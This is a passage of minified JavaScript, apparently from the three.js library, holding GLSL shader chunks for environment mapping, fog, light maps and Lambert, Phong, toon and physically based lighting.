uv.xy, vec2( a,b ) ), sn = mod( dt, PI );\n\treturn fract( sin( sn ) * c );\n}\n#ifdef HIGH_PRECISION\n\tfloat precisionSafeLength( vec3 v ) { return length( v ); }\n#else\n\tfloat precisionSafeLength( vec3 v ) {\n\t\tfloat maxComponent = max3( abs( v ) );\n\t\treturn length( v / maxComponent ) * maxComponent;\n\t}\n#endif\nstruct IncidentLight {\n\tvec3 color;\n\tvec3 direction;\n\tbool visible;\n};\nstruct ReflectedLight {\n\tvec3 directDiffuse;\n\tvec3 directSpecular;\n\tvec3 indirectDiffuse;\n\tvec3 indirectSpecular;\n};\nstruct GeometricContext {\n\tvec3 position;\n\tvec3 normal;\n\tvec3 viewDir;\n#ifdef USE_CLEARCOAT\n\tvec3 clearcoatNormal;\n#endif\n};\nvec3 transformDirection( in vec3 dir, in mat4 matrix ) {\n\treturn normalize( ( matrix * vec4( dir, 0.0 ) ).xyz );\n}\nvec3 inverseTransformDirection( in vec3 dir, in mat4 matrix ) {\n\treturn normalize( ( vec4( dir, 0.0 ) * matrix ).xyz );\n}\nmat3 transposeMat3( const in mat3 m ) {\n\tmat3 tmp;\n\ttmp[ 0 ] = vec3( m[ 0 ].x, m[ 1 ].x, m[ 2 ].x );\n\ttmp[ 1 ] = vec3( m[ 0 ].y, m[ 1 ].y, m[ 2 ].y );\n\ttmp[ 2 ] = vec3( m[ 0 ].z, m[ 1 ].z, m[ 2 ].z );\n\treturn tmp;\n}\nfloat linearToRelativeLuminance( const in vec3 color ) {\n\tvec3 weights = vec3( 0.2126, 0.7152, 0.0722 );\n\treturn dot( weights, color.rgb );\n}\nbool isPerspectiveMatrix( mat4 m ) {\n\treturn m[ 2 ][ 3 ] == - 1.0;\n}\nvec2 equirectUv( in vec3 dir ) {\n\tfloat u = atan( dir.z, dir.x ) * RECIPROCAL_PI2 + 0.5;\n\tfloat v = asin( clamp( dir.y, - 1.0, 1.0 ) ) * RECIPROCAL_PI + 0.5;\n\treturn vec2( u, v );\n}",cube_uv_reflection_fragment:"#ifdef ENVMAP_TYPE_CUBE_UV\n\t#define cubeUV_maxMipLevel 8.0\n\t#define cubeUV_minMipLevel 4.0\n\t#define cubeUV_maxTileSize 256.0\n\t#define cubeUV_minTileSize 16.0\n\tfloat getFace( vec3 direction ) {\n\t\tvec3 absDirection = abs( direction );\n\t\tfloat face = - 1.0;\n\t\tif ( absDirection.x > absDirection.z ) {\n\t\t\tif ( absDirection.x > absDirection.y )\n\t\t\t\tface = direction.x > 0.0 ? 0.0 : 3.0;\n\t\t\telse\n\t\t\t\tface = direction.y > 0.0 ? 1.0 : 4.0;\n\t\t} else {\n\t\t\tif ( absDirection.z > absDirection.y )\n\t\t\t\tface = direction.z > 0.0 ? 2.0 : 5.0;\n\t\t\telse\n\t\t\t\tface = direction.y > 0.0 ? 1.0 : 4.0;\n\t\t}\n\t\treturn face;\n\t}\n\tvec2 getUV( vec3 direction, float face ) {\n\t\tvec2 uv;\n\t\tif ( face == 0.0 ) {\n\t\t\tuv = vec2( direction.z, direction.y ) / abs( direction.x );\n\t\t} else if ( face == 1.0 ) {\n\t\t\tuv = vec2( - direction.x, - direction.z ) / abs( direction.y );\n\t\t} else if ( face == 2.0 ) {\n\t\t\tuv = vec2( - direction.x, direction.y ) / abs( direction.z );\n\t\t} else if ( face == 3.0 ) {\n\t\t\tuv = vec2( - direction.z, direction.y ) / abs( direction.x );\n\t\t} else if ( face == 4.0 ) {\n\t\t\tuv = vec2( - direction.x, direction.z ) / abs( direction.y );\n\t\t} else {\n\t\t\tuv = vec2( direction.x, direction.y ) / abs( direction.z );\n\t\t}\n\t\treturn 0.5 * ( uv + 1.0 );\n\t}\n\tvec3 bilinearCubeUV( sampler2D envMap, vec3 direction, float mipInt ) {\n\t\tfloat face = getFace( direction );\n\t\tfloat filterInt = max( cubeUV_minMipLevel - mipInt, 0.0 );\n\t\tmipInt = max( mipInt, cubeUV_minMipLevel );\n\t\tfloat faceSize = exp2( mipInt );\n\t\tfloat texelSize = 1.0 / ( 3.0 * cubeUV_maxTileSize );\n\t\tvec2 uv = getUV( direction, face ) * ( faceSize - 1.0 ) + 0.5;\n\t\tif ( face > 2.0 ) {\n\t\t\tuv.y += faceSize;\n\t\t\tface -= 3.0;\n\t\t}\n\t\tuv.x += face * faceSize;\n\t\tif ( mipInt < cubeUV_maxMipLevel ) {\n\t\t\tuv.y += 2.0 * cubeUV_maxTileSize;\n\t\t}\n\t\tuv.y += filterInt * 2.0 * cubeUV_minTileSize;\n\t\tuv.x += 3.0 * max( 0.0, cubeUV_maxTileSize - 2.0 * faceSize );\n\t\tuv *= texelSize;\n\t\treturn texture2D( envMap, uv ).rgb;\n\t}\n\t#define r0 1.0\n\t#define v0 0.339\n\t#define m0 - 2.0\n\t#define r1 0.8\n\t#define v1 0.276\n\t#define m1 - 1.0\n\t#define r4 0.4\n\t#define v4 0.046\n\t#define m4 2.0\n\t#define r5 0.305\n\t#define v5 0.016\n\t#define m5 3.0\n\t#define r6 0.21\n\t#define v6 0.0038\n\t#define m6 4.0\n\tfloat roughnessToMip( float roughness ) {\n\t\tfloat mip = 0.0;\n\t\tif ( roughness >= r1 ) {\n\t\t\tmip = ( r0 - roughness ) * ( m1 - m0 ) / ( r0 - r1 ) + m0;\n\t\t} else if ( roughness >= r4 ) {\n\t\t\tmip = ( r1 - roughness ) * ( m4 - m1 ) / ( r1 - r4 ) + m1;\n\t\t} else if ( roughness >= r5 ) {\n\t\t\tmip = ( r4 - roughness ) * ( m5 - m4 ) / ( r4 - r5 ) + m4;\n\t\t} else if ( roughness >= r6 ) {\n\t\t\tmip = ( r5 - roughness ) * ( m6 - m5 ) / ( r5 - r6 ) + m5;\n\t\t} else {\n\t\t\tmip = - 2.0 * log2( 1.16 * roughness );\t\t}\n\t\treturn mip;\n\t}\n\tvec4 textureCubeUV( sampler2D envMap, vec3 sampleDir, float roughness ) {\n\t\tfloat mip = clamp( roughnessToMip( roughness ), m0, cubeUV_maxMipLevel );\n\t\tfloat mipF = fract( mip );\n\t\tfloat mipInt = floor( mip );\n\t\tvec3 color0 = bilinearCubeUV( envMap, sampleDir, mipInt );\n\t\tif ( mipF == 0.0 ) {\n\t\t\treturn vec4( color0, 1.0 );\n\t\t} else {\n\t\t\tvec3 color1 = bilinearCubeUV( envMap, sampleDir, mipInt + 1.0 );\n\t\t\treturn vec4( mix( color0, color1, mipF ), 1.0 );\n\t\t}\n\t}\n#endif",defaultnormal_vertex:"vec3 transformedNormal = objectNormal;\n#ifdef USE_INSTANCING\n\tmat3 m = mat3( instanceMatrix );\n\ttransformedNormal /= vec3( dot( m[ 0 ], m[ 0 ] ), dot( m[ 1 ], m[ 1 ] ), dot( m[ 2 ], m[ 2 ] ) );\n\ttransformedNormal = m * transformedNormal;\n#endif\ntransformedNormal = normalMatrix * transformedNormal;\n#ifdef FLIP_SIDED\n\ttransformedNormal = - transformedNormal;\n#endif\n#ifdef USE_TANGENT\n\tvec3 transformedTangent = ( modelViewMatrix * vec4( objectTangent, 0.0 ) ).xyz;\n\t#ifdef FLIP_SIDED\n\t\ttransformedTangent = - transformedTangent;\n\t#endif\n#endif",displacementmap_pars_vertex:"#ifdef USE_DISPLACEMENTMAP\n\tuniform sampler2D displacementMap;\n\tuniform float displacementScale;\n\tuniform float displacementBias;\n#endif",displacementmap_vertex:"#ifdef USE_DISPLACEMENTMAP\n\ttransformed += normalize( objectNormal ) * ( texture2D( displacementMap, vUv ).x * displacementScale + displacementBias );\n#endif",emissivemap_fragment:"#ifdef USE_EMISSIVEMAP\n\tvec4 emissiveColor = texture2D( emissiveMap, vUv );\n\temissiveColor.rgb = emissiveMapTexelToLinear( emissiveColor ).rgb;\n\ttotalEmissiveRadiance *= emissiveColor.rgb;\n#endif",emissivemap_pars_fragment:"#ifdef USE_EMISSIVEMAP\n\tuniform sampler2D emissiveMap;\n#endif",encodings_fragment:"gl_FragColor = linearToOutputTexel( gl_FragColor );",encodings_pars_fragment:"vec4 LinearToLinear( in vec4 value ) {\n\treturn value;\n}\nvec4 sRGBToLinear( in vec4 value ) {\n\treturn vec4( mix( pow( value.rgb * 0.9478672986 + vec3( 0.0521327014 ), vec3( 2.4 ) ), value.rgb * 0.0773993808, vec3( lessThanEqual( value.rgb, vec3( 0.04045 ) ) ) ), value.a );\n}\nvec4 LinearTosRGB( in vec4 value ) {\n\treturn vec4( mix( pow( value.rgb, vec3( 0.41666 ) ) * 1.055 - vec3( 0.055 ), value.rgb * 12.92, vec3( lessThanEqual( value.rgb, vec3( 0.0031308 ) ) ) ), value.a );\n}",envmap_fragment:"#ifdef USE_ENVMAP\n\t#ifdef ENV_WORLDPOS\n\t\tvec3 cameraToFrag;\n\t\tif ( isOrthographic ) {\n\t\t\tcameraToFrag = normalize( vec3( - viewMatrix[ 0 ][ 2 ], - viewMatrix[ 1 ][ 2 ], - viewMatrix[ 2 ][ 2 ] ) );\n\t\t} else {\n\t\t\tcameraToFrag = normalize( vWorldPosition - cameraPosition );\n\t\t}\n\t\tvec3 worldNormal = inverseTransformDirection( normal, viewMatrix );\n\t\t#ifdef ENVMAP_MODE_REFLECTION\n\t\t\tvec3 reflectVec = reflect( cameraToFrag, worldNormal );\n\t\t#else\n\t\t\tvec3 reflectVec = refract( cameraToFrag, worldNormal, refractionRatio );\n\t\t#endif\n\t#else\n\t\tvec3 reflectVec = vReflect;\n\t#endif\n\t#ifdef ENVMAP_TYPE_CUBE\n\t\tvec4 envColor = textureCube( envMap, vec3( flipEnvMap * reflectVec.x, reflectVec.yz ) );\n\t\tenvColor = envMapTexelToLinear( envColor );\n\t#elif defined( ENVMAP_TYPE_CUBE_UV )\n\t\tvec4 envColor = textureCubeUV( envMap, reflectVec, 0.0 );\n\t#else\n\t\tvec4 envColor = vec4( 0.0 );\n\t#endif\n\t#ifdef ENVMAP_BLENDING_MULTIPLY\n\t\toutgoingLight = mix( outgoingLight, outgoingLight * envColor.xyz, specularStrength * reflectivity );\n\t#elif defined( ENVMAP_BLENDING_MIX )\n\t\toutgoingLight = mix( outgoingLight, envColor.xyz, specularStrength * reflectivity );\n\t#elif defined( ENVMAP_BLENDING_ADD )\n\t\toutgoingLight += envColor.xyz * specularStrength * reflectivity;\n\t#endif\n#endif",envmap_common_pars_fragment:"#ifdef USE_ENVMAP\n\tuniform float envMapIntensity;\n\tuniform float flipEnvMap;\n\t#ifdef ENVMAP_TYPE_CUBE\n\t\tuniform samplerCube envMap;\n\t#else\n\t\tuniform sampler2D envMap;\n\t#endif\n\t\n#endif",envmap_pars_fragment:"#ifdef USE_ENVMAP\n\tuniform float reflectivity;\n\t#if defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( PHONG )\n\t\t#define ENV_WORLDPOS\n\t#endif\n\t#ifdef ENV_WORLDPOS\n\t\tvarying vec3 vWorldPosition;\n\t\tuniform float refractionRatio;\n\t#else\n\t\tvarying vec3 vReflect;\n\t#endif\n#endif",envmap_pars_vertex:"#ifdef USE_ENVMAP\n\t#if defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) ||defined( PHONG )\n\t\t#define ENV_WORLDPOS\n\t#endif\n\t#ifdef ENV_WORLDPOS\n\t\t\n\t\tvarying vec3 vWorldPosition;\n\t#else\n\t\tvarying vec3 vReflect;\n\t\tuniform float refractionRatio;\n\t#endif\n#endif",envmap_physical_pars_fragment:"#if defined( USE_ENVMAP )\n\t#ifdef ENVMAP_MODE_REFRACTION\n\t\tuniform float refractionRatio;\n\t#endif\n\tvec3 getIBLIrradiance( const in vec3 normal ) {\n\t\t#if defined( ENVMAP_TYPE_CUBE_UV )\n\t\t\tvec3 worldNormal = inverseTransformDirection( normal, viewMatrix );\n\t\t\tvec4 envMapColor = textureCubeUV( envMap, worldNormal, 1.0 );\n\t\t\treturn PI * envMapColor.rgb * envMapIntensity;\n\t\t#else\n\t\t\treturn vec3( 0.0 );\n\t\t#endif\n\t}\n\tvec3 getIBLRadiance( const in vec3 viewDir, const in vec3 normal, const in float roughness ) {\n\t\t#if defined( ENVMAP_TYPE_CUBE_UV )\n\t\t\tvec3 reflectVec;\n\t\t\t#ifdef ENVMAP_MODE_REFLECTION\n\t\t\t\treflectVec = reflect( - viewDir, normal );\n\t\t\t\treflectVec = normalize( mix( reflectVec, normal, roughness * roughness) );\n\t\t\t#else\n\t\t\t\treflectVec = refract( - viewDir, normal, refractionRatio );\n\t\t\t#endif\n\t\t\treflectVec = inverseTransformDirection( reflectVec, viewMatrix );\n\t\t\tvec4 envMapColor = textureCubeUV( envMap, reflectVec, roughness );\n\t\t\treturn envMapColor.rgb * envMapIntensity;\n\t\t#else\n\t\t\treturn vec3( 0.0 );\n\t\t#endif\n\t}\n#endif",envmap_vertex:"#ifdef USE_ENVMAP\n\t#ifdef ENV_WORLDPOS\n\t\tvWorldPosition = worldPosition.xyz;\n\t#else\n\t\tvec3 cameraToVertex;\n\t\tif ( isOrthographic ) {\n\t\t\tcameraToVertex = normalize( vec3( - viewMatrix[ 0 ][ 2 ], - viewMatrix[ 1 ][ 2 ], - viewMatrix[ 2 ][ 2 ] ) );\n\t\t} else {\n\t\t\tcameraToVertex = normalize( worldPosition.xyz - cameraPosition );\n\t\t}\n\t\tvec3 worldNormal = inverseTransformDirection( transformedNormal, viewMatrix );\n\t\t#ifdef ENVMAP_MODE_REFLECTION\n\t\t\tvReflect = reflect( cameraToVertex, worldNormal );\n\t\t#else\n\t\t\tvReflect = refract( cameraToVertex, worldNormal, refractionRatio );\n\t\t#endif\n\t#endif\n#endif",fog_vertex:"#ifdef USE_FOG\n\tvFogDepth = - mvPosition.z;\n#endif",fog_pars_vertex:"#ifdef USE_FOG\n\tvarying float vFogDepth;\n#endif",fog_fragment:"#ifdef USE_FOG\n\t#ifdef FOG_EXP2\n\t\tfloat fogFactor = 1.0 - exp( - fogDensity * fogDensity * vFogDepth * vFogDepth );\n\t#else\n\t\tfloat fogFactor = smoothstep( fogNear, fogFar, vFogDepth );\n\t#endif\n\tgl_FragColor.rgb = mix( gl_FragColor.rgb, fogColor, fogFactor );\n#endif",fog_pars_fragment:"#ifdef USE_FOG\n\tuniform vec3 fogColor;\n\tvarying float vFogDepth;\n\t#ifdef FOG_EXP2\n\t\tuniform float fogDensity;\n\t#else\n\t\tuniform float fogNear;\n\t\tuniform float fogFar;\n\t#endif\n#endif",gradientmap_pars_fragment:"#ifdef USE_GRADIENTMAP\n\tuniform sampler2D gradientMap;\n#endif\nvec3 getGradientIrradiance( vec3 normal, vec3 lightDirection ) {\n\tfloat dotNL = dot( normal, lightDirection );\n\tvec2 coord = vec2( dotNL * 0.5 + 0.5, 0.0 );\n\t#ifdef USE_GRADIENTMAP\n\t\treturn vec3( texture2D( gradientMap, coord ).r );\n\t#else\n\t\treturn ( coord.x < 0.7 ) ? vec3( 0.7 ) : vec3( 1.0 );\n\t#endif\n}",lightmap_fragment:"#ifdef USE_LIGHTMAP\n\tvec4 lightMapTexel = texture2D( lightMap, vUv2 );\n\tvec3 lightMapIrradiance = lightMapTexelToLinear( lightMapTexel ).rgb * lightMapIntensity;\n\t#ifndef PHYSICALLY_CORRECT_LIGHTS\n\t\tlightMapIrradiance *= PI;\n\t#endif\n\treflectedLight.indirectDiffuse += lightMapIrradiance;\n#endif",lightmap_pars_fragment:"#ifdef USE_LIGHTMAP\n\tuniform sampler2D lightMap;\n\tuniform float lightMapIntensity;\n#endif",lights_lambert_vertex:"vec3 diffuse = vec3( 1.0 );\nGeometricContext geometry;\ngeometry.position = mvPosition.xyz;\ngeometry.normal = normalize( transformedNormal );\ngeometry.viewDir = ( isOrthographic ) ? vec3( 0, 0, 1 ) : normalize( -mvPosition.xyz );\nGeometricContext backGeometry;\nbackGeometry.position = geometry.position;\nbackGeometry.normal = -geometry.normal;\nbackGeometry.viewDir = geometry.viewDir;\nvLightFront = vec3( 0.0 );\nvIndirectFront = vec3( 0.0 );\n#ifdef DOUBLE_SIDED\n\tvLightBack = vec3( 0.0 );\n\tvIndirectBack = vec3( 0.0 );\n#endif\nIncidentLight directLight;\nfloat dotNL;\nvec3 directLightColor_Diffuse;\nvIndirectFront += getAmbientLightIrradiance( ambientLightColor );\nvIndirectFront += getLightProbeIrradiance( lightProbe, geometry.normal );\n#ifdef DOUBLE_SIDED\n\tvIndirectBack += getAmbientLightIrradiance( ambientLightColor );\n\tvIndirectBack += getLightProbeIrradiance( lightProbe, backGeometry.normal );\n#endif\n#if NUM_POINT_LIGHTS > 0\n\t#pragma unroll_loop_start\n\tfor ( int i = 0; i < NUM_POINT_LIGHTS; i ++ ) {\n\t\tgetPointLightInfo( pointLights[ i ], geometry, directLight );\n\t\tdotNL = dot( geometry.normal, directLight.direction );\n\t\tdirectLightColor_Diffuse = directLight.color;\n\t\tvLightFront += saturate( dotNL ) * directLightColor_Diffuse;\n\t\t#ifdef DOUBLE_SIDED\n\t\t\tvLightBack += saturate( - dotNL ) * directLightColor_Diffuse;\n\t\t#endif\n\t}\n\t#pragma unroll_loop_end\n#endif\n#if NUM_SPOT_LIGHTS > 0\n\t#pragma unroll_loop_start\n\tfor ( int i = 0; i < NUM_SPOT_LIGHTS; i ++ ) {\n\t\tgetSpotLightInfo( spotLights[ i ], geometry, directLight );\n\t\tdotNL = dot( geometry.normal, directLight.direction );\n\t\tdirectLightColor_Diffuse = directLight.color;\n\t\tvLightFront += saturate( dotNL ) * directLightColor_Diffuse;\n\t\t#ifdef DOUBLE_SIDED\n\t\t\tvLightBack += saturate( - dotNL ) * directLightColor_Diffuse;\n\t\t#endif\n\t}\n\t#pragma unroll_loop_end\n#endif\n#if NUM_DIR_LIGHTS > 0\n\t#pragma unroll_loop_start\n\tfor ( int i = 0; i < NUM_DIR_LIGHTS; i ++ ) {\n\t\tgetDirectionalLightInfo( directionalLights[ i ], geometry, directLight );\n\t\tdotNL = dot( geometry.normal, directLight.direction );\n\t\tdirectLightColor_Diffuse = directLight.color;\n\t\tvLightFront += saturate( dotNL ) * directLightColor_Diffuse;\n\t\t#ifdef DOUBLE_SIDED\n\t\t\tvLightBack += saturate( - dotNL ) * directLightColor_Diffuse;\n\t\t#endif\n\t}\n\t#pragma unroll_loop_end\n#endif\n#if NUM_HEMI_LIGHTS > 0\n\t#pragma unroll_loop_start\n\tfor ( int i = 0; i < NUM_HEMI_LIGHTS; i ++ ) {\n\t\tvIndirectFront += getHemisphereLightIrradiance( hemisphereLights[ i ], geometry.normal );\n\t\t#ifdef DOUBLE_SIDED\n\t\t\tvIndirectBack += getHemisphereLightIrradiance( hemisphereLights[ i ], backGeometry.normal );\n\t\t#endif\n\t}\n\t#pragma unroll_loop_end\n#endif",lights_pars_begin:"uniform bool receiveShadow;\nuniform vec3 ambientLightColor;\nuniform vec3 lightProbe[ 9 ];\nvec3 shGetIrradianceAt( in vec3 normal, in vec3 shCoefficients[ 9 ] ) {\n\tfloat x = normal.x, y = normal.y, z = normal.z;\n\tvec3 result = shCoefficients[ 0 ] * 0.886227;\n\tresult += shCoefficients[ 1 ] * 2.0 * 0.511664 * y;\n\tresult += shCoefficients[ 2 ] * 2.0 * 0.511664 * z;\n\tresult += shCoefficients[ 3 ] * 2.0 * 0.511664 * x;\n\tresult += shCoefficients[ 4 ] * 2.0 * 0.429043 * x * y;\n\tresult += shCoefficients[ 5 ] * 2.0 * 0.429043 * y * z;\n\tresult += shCoefficients[ 6 ] * ( 0.743125 * z * z - 0.247708 );\n\tresult += shCoefficients[ 7 ] * 2.0 * 0.429043 * x * z;\n\tresult += shCoefficients[ 8 ] * 0.429043 * ( x * x - y * y );\n\treturn result;\n}\nvec3 getLightProbeIrradiance( const in vec3 lightProbe[ 9 ], const in vec3 normal ) {\n\tvec3 worldNormal = inverseTransformDirection( normal, viewMatrix );\n\tvec3 irradiance = shGetIrradianceAt( worldNormal, lightProbe );\n\treturn irradiance;\n}\nvec3 getAmbientLightIrradiance( const in vec3 ambientLightColor ) {\n\tvec3 irradiance = ambientLightColor;\n\treturn irradiance;\n}\nfloat getDistanceAttenuation( const in float lightDistance, const in float cutoffDistance, const in float decayExponent ) {\n\t#if defined ( PHYSICALLY_CORRECT_LIGHTS )\n\t\tfloat distanceFalloff = 1.0 / max( pow( lightDistance, decayExponent ), 0.01 );\n\t\tif ( cutoffDistance > 0.0 ) {\n\t\t\tdistanceFalloff *= pow2( saturate( 1.0 - pow4( lightDistance / cutoffDistance ) ) );\n\t\t}\n\t\treturn distanceFalloff;\n\t#else\n\t\tif ( cutoffDistance > 0.0 && decayExponent > 0.0 ) {\n\t\t\treturn pow( saturate( - lightDistance / cutoffDistance + 1.0 ), decayExponent );\n\t\t}\n\t\treturn 1.0;\n\t#endif\n}\nfloat getSpotAttenuation( const in float coneCosine, const in float penumbraCosine, const in float angleCosine ) {\n\treturn smoothstep( coneCosine, penumbraCosine, angleCosine );\n}\n#if NUM_DIR_LIGHTS > 0\n\tstruct DirectionalLight {\n\t\tvec3 direction;\n\t\tvec3 color;\n\t};\n\tuniform DirectionalLight directionalLights[ NUM_DIR_LIGHTS ];\n\tvoid getDirectionalLightInfo( const in DirectionalLight directionalLight, const in GeometricContext geometry, out IncidentLight light ) {\n\t\tlight.color = directionalLight.color;\n\t\tlight.direction = directionalLight.direction;\n\t\tlight.visible = true;\n\t}\n#endif\n#if NUM_POINT_LIGHTS > 0\n\tstruct PointLight {\n\t\tvec3 position;\n\t\tvec3 color;\n\t\tfloat distance;\n\t\tfloat decay;\n\t};\n\tuniform PointLight pointLights[ NUM_POINT_LIGHTS ];\n\tvoid getPointLightInfo( const in PointLight pointLight, const in GeometricContext geometry, out IncidentLight light ) {\n\t\tvec3 lVector = pointLight.position - geometry.position;\n\t\tlight.direction = normalize( lVector );\n\t\tfloat lightDistance = length( lVector );\n\t\tlight.color = pointLight.color;\n\t\tlight.color *= getDistanceAttenuation( lightDistance, pointLight.distance, pointLight.decay );\n\t\tlight.visible = ( light.color != vec3( 0.0 ) );\n\t}\n#endif\n#if NUM_SPOT_LIGHTS > 0\n\tstruct SpotLight {\n\t\tvec3 position;\n\t\tvec3 direction;\n\t\tvec3 color;\n\t\tfloat distance;\n\t\tfloat decay;\n\t\tfloat coneCos;\n\t\tfloat penumbraCos;\n\t};\n\tuniform SpotLight spotLights[ NUM_SPOT_LIGHTS ];\n\tvoid getSpotLightInfo( const in SpotLight spotLight, const in GeometricContext geometry, out IncidentLight light ) {\n\t\tvec3 lVector = spotLight.position - geometry.position;\n\t\tlight.direction = normalize( lVector );\n\t\tfloat angleCos = dot( light.direction, spotLight.direction );\n\t\tfloat spotAttenuation = getSpotAttenuation( spotLight.coneCos, spotLight.penumbraCos, angleCos );\n\t\tif ( spotAttenuation > 0.0 ) {\n\t\t\tfloat lightDistance = length( lVector );\n\t\t\tlight.color = spotLight.color * spotAttenuation;\n\t\t\tlight.color *= getDistanceAttenuation( lightDistance, spotLight.distance, spotLight.decay );\n\t\t\tlight.visible = ( light.color != vec3( 0.0 ) );\n\t\t} else {\n\t\t\tlight.color = vec3( 0.0 );\n\t\t\tlight.visible = false;\n\t\t}\n\t}\n#endif\n#if NUM_RECT_AREA_LIGHTS > 0\n\tstruct RectAreaLight {\n\t\tvec3 color;\n\t\tvec3 position;\n\t\tvec3 halfWidth;\n\t\tvec3 halfHeight;\n\t};\n\tuniform sampler2D ltc_1;\tuniform sampler2D ltc_2;\n\tuniform RectAreaLight rectAreaLights[ NUM_RECT_AREA_LIGHTS ];\n#endif\n#if NUM_HEMI_LIGHTS > 0\n\tstruct HemisphereLight {\n\t\tvec3 direction;\n\t\tvec3 skyColor;\n\t\tvec3 groundColor;\n\t};\n\tuniform HemisphereLight hemisphereLights[ NUM_HEMI_LIGHTS ];\n\tvec3 getHemisphereLightIrradiance( const in HemisphereLight hemiLight, const in vec3 normal ) {\n\t\tfloat dotNL = dot( normal, hemiLight.direction );\n\t\tfloat hemiDiffuseWeight = 0.5 * dotNL + 0.5;\n\t\tvec3 irradiance = mix( hemiLight.groundColor, hemiLight.skyColor, hemiDiffuseWeight );\n\t\treturn irradiance;\n\t}\n#endif",lights_toon_fragment:"ToonMaterial material;\nmaterial.diffuseColor = diffuseColor.rgb;",lights_toon_pars_fragment:"varying vec3 vViewPosition;\nstruct ToonMaterial {\n\tvec3 diffuseColor;\n};\nvoid RE_Direct_Toon( const in IncidentLight directLight, const in GeometricContext geometry, const in ToonMaterial material, inout ReflectedLight reflectedLight ) {\n\tvec3 irradiance = getGradientIrradiance( geometry.normal, directLight.direction ) * directLight.color;\n\treflectedLight.directDiffuse += irradiance * BRDF_Lambert( material.diffuseColor );\n}\nvoid RE_IndirectDiffuse_Toon( const in vec3 irradiance, const in GeometricContext geometry, const in ToonMaterial material, inout ReflectedLight reflectedLight ) {\n\treflectedLight.indirectDiffuse += irradiance * BRDF_Lambert( material.diffuseColor );\n}\n#define RE_Direct\t\t\t\tRE_Direct_Toon\n#define RE_IndirectDiffuse\t\tRE_IndirectDiffuse_Toon\n#define Material_LightProbeLOD( material )\t(0)",lights_phong_fragment:"BlinnPhongMaterial material;\nmaterial.diffuseColor = diffuseColor.rgb;\nmaterial.specularColor = specular;\nmaterial.specularShininess = shininess;\nmaterial.specularStrength = specularStrength;",lights_phong_pars_fragment:"varying vec3 vViewPosition;\nstruct BlinnPhongMaterial {\n\tvec3 diffuseColor;\n\tvec3 specularColor;\n\tfloat specularShininess;\n\tfloat specularStrength;\n};\nvoid RE_Direct_BlinnPhong( const in IncidentLight directLight, const in GeometricContext geometry, const in BlinnPhongMaterial material, inout ReflectedLight reflectedLight ) {\n\tfloat dotNL = saturate( dot( geometry.normal, directLight.direction ) );\n\tvec3 irradiance = dotNL * directLight.color;\n\treflectedLight.directDiffuse += irradiance * BRDF_Lambert( material.diffuseColor );\n\treflectedLight.directSpecular += irradiance * BRDF_BlinnPhong( directLight.direction, geometry.viewDir, geometry.normal, material.specularColor, material.specularShininess ) * material.specularStrength;\n}\nvoid RE_IndirectDiffuse_BlinnPhong( const in vec3 irradiance, const in GeometricContext geometry, const in BlinnPhongMaterial material, inout ReflectedLight reflectedLight ) {\n\treflectedLight.indirectDiffuse += irradiance * BRDF_Lambert( material.diffuseColor );\n}\n#define RE_Direct\t\t\t\tRE_Direct_BlinnPhong\n#define RE_IndirectDiffuse\t\tRE_IndirectDiffuse_BlinnPhong\n#define Material_LightProbeLOD( material )\t(0)",lights_physical_fragment:"PhysicalMaterial material;\nmaterial.diffuseColor = diffuseColor.rgb * ( 1.0 - metalnessFactor );\nvec3 dxy = max( abs( dFdx( geometryNormal ) ), abs( dFdy( geometryNormal ) ) );\nfloat geometryRoughness = max( max( dxy.x, dxy.y ), dxy.z );\nmaterial.roughness = max( roughnessFactor, 0.0525 );material.roughness += geometryRoughness;\nmaterial.roughness = min( material.roughness, 1.0 );\n#ifdef IOR\n\t#ifdef SPECULAR\n\t\tfloat specularIntensityFactor = specularIntensity;\n\t\tvec3 specularColorFactor = specularColor;\n\t\t#ifdef USE_SPECULARINTENSITYMAP\n\t\t\tspecularIntensityFactor *= texture2D( specularIntensityMap, vUv ).a;\n\t\t#endif\n\t\t#ifdef USE_SPECULARCOLORMAP\n\t\t\tspecularColorFactor *= specularColorMapTexelToLinear( texture2D( specularColorMap, vUv ) ).rgb;\n\t\t#endif\n\t\tmaterial.specularF90 = mix( specularIntensityFactor, 1.0, metalnessFactor );\n\t#else\n\t\tfloat specularIntensityFactor = 1.0;\n\t\tvec3 specularColorFactor = vec3( 1.0 );\n\t\tmaterial.specularF90 = 1.0;\n\t#endif\n\tmaterial.specularColor = mix( min( pow2( ( ior - 1.0 ) / ( ior + 1.0 ) ) * specularColorFactor, vec3( 1.0 ) ) * specularIntensityFactor, diffuseColor.rgb, metalnessFactor );\n#else\n\tmaterial.specularColor = mix( vec3( 0.04 ), diffuseColor.rgb, metalnessFactor );\n\tmaterial.specularF90 = 1.0;\n#endif\n#ifdef USE_CLEARCOAT\n\tmaterial.clearcoat = clearcoat;\n\tmaterial.clearcoatRoughness = clearcoatRoughness;\n\tmaterial.clearcoatF0 = vec3( 0.04 );\n\tmaterial.clearcoatF90 = 1.0;\n\t#ifdef USE_CLEARCOATMAP\n\t\tmaterial.clearcoat *= texture2D( clearcoatMap, vUv ).x;\n\t#endif\n\t#ifdef USE_CLEARCOAT_ROUGHNESSMAP\n\t\tmaterial.clearcoatRoughness *= texture2D( clearcoatRoughnessMap, vUv ).y;\n\t#endif\n\tmaterial.clearcoat = saturate( material.clearcoat );\tmaterial.clearcoatRoughness = max( material.clearcoatRoughness, 0.0525 );\n\tmaterial.clearcoatRoughness += geometryRoughness;\n\tmaterial.clearcoatRoughness = min( material.clearcoatRoughness, 1.0 );\n#endif\n#ifdef USE_SHEEN\n\tmaterial.sheenColor = sheenColor;\n\t#ifdef USE_SHEENCOLORMAP\n\t\tmaterial.sheenColor *= sheenColorMapTexelToLinear( texture2D( sheenColorMap, vUv ) ).rgb;\n\t#endif\n\tmaterial.sheenRoughness = clamp( sheenRoughness, 0.07, 1.0 );\n\t#ifdef USE_SHEENROUGHNESSMAP\n\t\tmaterial.sheenRoughness *= texture2D( sheenRoughnessMap, vUv ).a;\n\t#endif\n#endif",lights_physical_pars_fragment:"struct PhysicalMaterial {\n\tvec3 diffuseColor;\n\tfloat roughness;\n\tvec3 specularColor;\n\tfloat specularF90;\n\t#ifdef USE_CLEARCOAT\n\t\tfloat clearcoat;\n\t\tfloat clearcoatRoughness;\n\t\tvec3 clearcoatF0;\n\t\tfloat clearcoatF90;\n\t#endif\n\t#ifdef USE_SHEEN\n\t\tvec3 sheenColor;\n\t\tfloat sheenRoughness;\n\t#endif\n};\nvec3 clearcoatSpecular = vec3( 0.0 );\nvec3 